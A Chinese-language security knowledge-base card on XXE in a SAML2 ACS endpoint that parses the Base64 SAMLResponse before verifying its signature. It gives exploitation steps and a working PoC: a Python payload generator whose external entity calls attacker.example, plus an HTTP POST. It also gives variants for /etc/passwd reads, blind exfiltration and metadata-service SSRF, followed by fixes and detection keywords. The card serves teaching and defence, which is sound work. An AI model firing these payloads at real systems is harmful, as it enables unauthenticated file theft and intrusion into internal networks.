---
id: web-generic-xxe-saml-acs-parse-before-signature
title: 未授权 SAML ACS 在签名校验前解析 XML 触发 XXE OOB
type: scenario
domain: web
path: web/generic/xxe
technique: saml-acs-xxe-before-signature-verification
aliases:
- SAMLResponse XXE
- SAML ACS XXE
- 签名校验前 XXE
- SAML 断言解析外部实体
- DocumentBuilderFactory SAML XXE
- 未授权 SAML 端点 XXE
- SAML ACS OOB
tags:
- xxe
- saml
- saml2
- acs
- java
- xml
- external-entity
- oob
- ssrf
- unauthenticated
- signature-bypass-order
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V28
  verified_at: '2026-11-05T03:11:28+08:00'
  notes: 已对照原文与图27-30核对：SAML2PortalController.getXMLObject 用未加固 DocumentBuilderFactory 解析，/saml2/acs 取 SAMLResponse→Base64→getXMLObject 在验签前；图29返回500、图30 requestrepo 收到DNS+HTTP /xxe 回连，OOB XXE 已证实；未演示文件读取，卡内已写为可扩展。Shiro filterChainDefinitions 未覆盖 portal 前缀见 图04。原文未给产品/版本，无 versions。
---

## 一句话结论

SAML2 的 ACS（Assertion Consumer Service）端点把表单里的 `SAMLResponse` 先 Base64 解码，再用未加固的 `DocumentBuilderFactory` 解析成 XML，之后才做签名校验；由于解析发生在验签之前，攻击者无需有效签名、甚至无需登录，就能用带外部实体的 SAML 断言触发 XXE，让目标解析器主动发起 DNS/HTTP 请求（OOB），并可按同一原语扩展为文件读取或内网探测。

## 原理

- SAML2 的 HTTP-POST 绑定把断言放在 `SAMLResponse` 表单字段里，通常是 Base64；ACS 端点必须解码并解析 XML 才能读取 Issuer、Status、Assertion 等元素。
- 脆弱实现直接 `DocumentBuilderFactory.newInstance()` + `setNamespaceAware(true)`，没有设置 `disallow-doctype-decl`、`external-general-entities=false`、`external-parameter-entities=false`、`FEATURE_SECURE_PROCESSING`；Java 默认允许 DOCTYPE 与外部实体。
- 解析器遇到 `<!ENTITY xxe SYSTEM "http://attacker/xxe">` 后，会在文档中 `&xxe;` 的位置读取该 URI；即使实体内容最终不被业务使用，DNS 解析与 HTTP 请求也已经发生。
- **顺序问题**：代码先 `getXMLObject(resp)` 解析，再进入签名校验。即便签名校验实现正确，攻击载荷在验签前就已执行；无效签名只会让流程在之后返回 500/401，不能阻止 XXE。
- ACS 端点通常位于 `portal`/`unprotected` 一类未配置 Shiro 规则的前缀下，攻击者不需要账号即可提交 `SAMLResponse`；签名校验是业务层逻辑，不是入口鉴权。
- 由于响应可能只返回 XML 解析错误（如元素结构不符合 SAML schema），攻击者不需要回显：用 DNS/HTTP 回连确认实体解析成功，再改用参数实体或 `file://` 读取/外带。

## 触发条件

- 应用启用 SAML2 SP，暴露 ACS 端点（如 `/saml2/acs`、`/controller/portal/**`），且该端点未被 Shiro/网关鉴权覆盖。
- ACS 处理流程先把 `SAMLResponse` Base64 解码并解析 XML，再做签名/结构校验。
- XML 解析器未禁用 DOCTYPE 与外部实体（`DocumentBuilderFactory` 默认配置即满足）。
- OOB 验证要求目标可出网做 DNS/HTTP；文件读取要求进程对目标文件可读且解析结果可回显或可外带。
- 若解析器已设置 `disallow-doctype-decl=true`、禁用外部实体，或使用默认安全封装的 SAML 库，则不成立。

## 利用步骤

1. 找到 ACS 端点与参数名（常见 `SAMLResponse`，POST `application/x-www-form-urlencoded`），确认端点不需要登录。
2. 构造最小 SAML Response XML，在 DOCTYPE 中声明外部实体，并在 Issuer 等文本节点引用它：
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.example/xxe">]>
   <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="test" Version="2.0">
     <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
   </samlp:Response>
   ```
3. Base64 编码后作为 `SAMLResponse` POST 到 ACS。
4. 在攻击者 DNS/HTTP 平台观察请求；即使 ACS 返回 500/schema 错误，只要回连出现，XXE 已触发。
5. 读取文件时把实体改成 `file:///etc/passwd` 并让内容进入回显字段；无回显则用参数实体 + 外部 DTD 把内容拼到 URL 外带（见关联卡）。
6. 探测内网时把 `SYSTEM` 换成内网 URL，观察响应时间/错误差异或 OOB 回连。

## PoC

```bash
# 生成 payload（隔离环境，域名替换为自己的回连平台）
python3 - <<'PY'
import base64
xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.example/xxe">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="test" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
</samlp:Response>'''
print(base64.b64encode(xml.encode()).decode())
PY
```

```http
POST /saml2/acs HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

SAMLResponse=<base64-of-xml>
```

```text
预期：
- 回连平台收到 DNS 查询与 HTTP GET /xxe；
- ACS 可能返回 500（如 "元素类型 samlp:Status 必须后跟属性规范"），这是解析/结构错误，不代表 XXE 未触发；
- 若先验签再解析，则无效签名会直接拒绝，不应出现回连。
```

## 变体与关联

- 变体（盲外带）：`<!ENTITY % file SYSTEM "file:///etc/passwd">` + 外部 DTD 把 `%file;` 拼进攻击者 URL，绕过无回显。
- 变体（SSRF）：`SYSTEM "http://169.254.169.254/..."` 或内网地址，利用解析器作为请求代理；可用 DNS/时间差判断可达性。
- 变体（协议）：`jar:`、`netdoc:`、`php://filter` 取决于解析器与语言。
- 关联：[[web-generic-xxe-inband-file-read-default-insecure]]（DocumentBuilder 默认不安全的通用文件读取）、[[web-generic-xxe-oob-exfil]]（盲 XXE 外带）、[[web-generic-xxe-reflected-xml-ssrf-internal-service]]（XML 实体 SSRF）。
- 边界：端点若在解析前做严格的 XML 结构/大小校验，可能提前拒绝 DOCTYPE；但“先验签再解析”本身与 SAML 验签需求冲突，实践中应以安全解析器解决，而不是依赖验签顺序。

## 检测与防御

- 修复：所有 XML 解析器在 `parse` 前显式设置 `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`，并禁用 `external-general-entities`、`external-parameter-entities`、`XMLConstants.FEATURE_SECURE_PROCESSING`；同时 `setXIncludeAware(false)`、`setExpandEntityReferences(false)`。
- 修复：使用经过安全封装的 SAML 库（如 OpenSAML 的加固配置），不要手写 `DocumentBuilderFactory`；对 `SAMLResponse` 限制大小与结构。
- 鉴权：ACS 端点虽需公开，但必须只接受符合协议的最小 XML；Shiro/网关规则应覆盖所有 controller 前缀，不能把“有签名校验”当作入口鉴权。
- 加固：应用进程默认禁止出网；解析器沙箱化；限制可读文件范围。
- 检测：请求体/解码后的 `SAMLResponse` 含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`http://`；ACS 返回 XML schema 错误同时应用进程发起外部 DNS/HTTP；`DocumentBuilderFactory` 解析后出现非预期外部连接；日志中 SAMLResponse 体积/结构异常。
